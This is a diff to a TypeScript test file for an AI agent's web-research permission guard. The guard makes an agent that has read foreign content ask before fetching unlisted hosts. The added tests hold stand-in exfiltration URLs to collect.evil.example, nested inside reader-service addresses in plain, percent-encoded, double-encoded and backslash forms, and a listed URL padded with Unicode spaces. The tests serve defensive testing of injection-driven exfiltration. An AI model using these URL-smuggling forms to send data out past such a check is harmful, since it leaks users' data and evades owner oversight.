@@ -20,7 +20,7 @@ import { Agent } from '../../core/agent.js';
 import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
 import { ConversationLatch } from '../../core/conversation-latch.js';
 import { flattenPrompt } from '../../core/prompt-value.js';
-import { createWebSearchTool, readUrlHasQuery } from './web-search-tool.js';
+import { createWebSearchTool } from './web-search-tool.js';
 import type { SearchProvider } from './search-provider.js';
 
 type Result = { content: unknown; is_error?: boolean };
@@ -131,15 +131,7 @@ describe('what stays a plain read', () => {
   });
 });
 
-describe('readUrlHasQuery', () => {
-  it('sees a query, ignores a fragment and an empty `?`, and counts an unparseable URL as carrying one', () => {
-    expect(readUrlHasQuery('https://a.example/p?x=1')).toBe(true);
-    expect(readUrlHasQuery('https://a.example/p')).toBe(false);
-    expect(readUrlHasQuery('https://a.example/p#q=1')).toBe(false);
-    expect(readUrlHasQuery('https://a.example/p?')).toBe(false);
-    expect(readUrlHasQuery('not a url')).toBe(true);
-  });
-
+describe('an address that does not parse', () => {
   it('an unparseable read URL after foreign content is refused as unreadable, as an address and not a recipient', async () => {
     const tool = webResearch();
     const ask = asker('Allow');
@@ -266,5 +258,63 @@ describe('an address a search listed', () => {
     await read(agent, 'https://collect.evil.example/d/x');
     await read(agent, 'https://collect.evil.example/d/x');
     expect(ask.asked).toHaveLength(2);
+  });
+});
+
+describe('a listed address is compared in the form it is fetched in', () => {
+  it('a listed address with Unicode spaces appended is asked about: they reach the server, encoded in the path', async () => {
+    const tool = webResearchSearching([{ url: 'https://news.example.org/story/42' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, 'story 42');
+    await read(agent, 'https://news.example.org/story/42\u3000\u00a0\u2003');
+    expect(ask.asked).toHaveLength(1);
+    expect(tool.reads).toEqual([]);
+  });
+
+  it('CONTROL: a listed address written with a trailing slash the parser adds anyway is the same address', async () => {
+    const tool = webResearchSearching([{ url: 'https://news.example.org' }]);
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner() });
+    await search(agent, 'headlines today');
+    await read(agent, 'https://news.example.org/');
+    expect(ask.asked).toEqual([]);
+  });
+});
+
+describe('an address that carries another address for a service to fetch', () => {
+  for (const [form, url] of [
+    ['plain', 'https://reader.example.ch/https://collect.evil.example/d/secret'],
+    ['percent-encoded', 'https://reader.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd%2Fsecret'],
+    ['encoded twice', 'https://reader.example.ch/fetch?u=https%253A%252F%252Fcollect.evil.example%252Fd'],
+    ['with backslashes', 'https://reader.example.ch/https:%5C%5Ccollect.evil.example/d'],
+  ] as const) {
+    it(`a read of a named host that carries an unnamed host (${form}) is asked about, naming that host`, async () => {
+      const tool = webResearch();
+      const ask = asker('Deny');
+      const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
+      await read(agent, url);
+      expect(ask.asked).toHaveLength(1);
+      expect(ask.asked[0]).toContain('"collect.evil.example"');
+      expect(ask.asked[0]).not.toContain('"reader.example.ch"');
+      expect(tool.reads).toEqual([]);
+    });
+  }
+
+  it('CONTROL: when the owner named both hosts, it is read without a question', async () => {
+    const tool = webResearch();
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch for docs.example.ch') });
+    await read(agent, 'https://reader.example.ch/https://docs.example.ch/guide');
+    expect(ask.asked).toEqual([]);
+    expect(tool.reads).toEqual(['https://reader.example.ch/https://docs.example.ch/guide']);
+  });
+
+  it('CONTROL: a fragment is never sent, so an address in it is no target', async () => {
+    const tool = webResearch();
+    const ask = asker('Deny');
+    const agent = taintedAgentOf({ tools: [tool], promptUser: ask.fn, ownerKnown: owner('use reader.example.ch') });
+    await read(agent, 'https://reader.example.ch/page#https://collect.evil.example/d');
+    expect(ask.asked).toEqual([]);
   });
 });
